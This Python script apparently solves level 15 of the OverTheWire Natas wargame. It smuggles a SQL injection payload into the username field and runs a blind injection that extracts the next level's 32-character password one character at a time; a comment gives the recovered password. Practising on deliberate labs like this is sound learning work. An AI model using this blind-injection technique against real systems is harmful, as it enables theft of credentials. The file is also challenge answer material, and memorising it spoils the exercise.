import string

import requests

import natas14


def payload(s: str) -> str:
    return 'natas16" AND password LIKE BINARY "{s}%"; -- '.format(s=s)


def solution() -> str:
    url = "http://natas15.natas.labs.overthewire.org"
    username = "natas15"
    password = natas14.solution()

    # The source code shows a SQL injection vulnerability, but there is not
    # an obvious way to show the output, suggesting blind SQL injection.
    # Passwords in previous labs have been alphanumeric and 32 characters.

    choices = string.ascii_letters + string.digits
    PASSWORD_LENGTH = 32
    known = ""
    auth = (username, password)

    # Make a single pass through possible characters to reduce the
    # number of guesses.
    for choice in choices:
        data = {"username": payload("%" + choice)}
        r = requests.post(url, auth=auth, data=data)
        if "exists" in r.text:
            known += choice
    natas16_password = ""
    while len(natas16_password) < PASSWORD_LENGTH:
        for choice in known:
            data = {"username": payload(natas16_password + choice)}
            r = requests.post(url, auth=auth, data=data)
            if "exists" in r.text:
                natas16_password += choice
    # WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
    return natas16_password
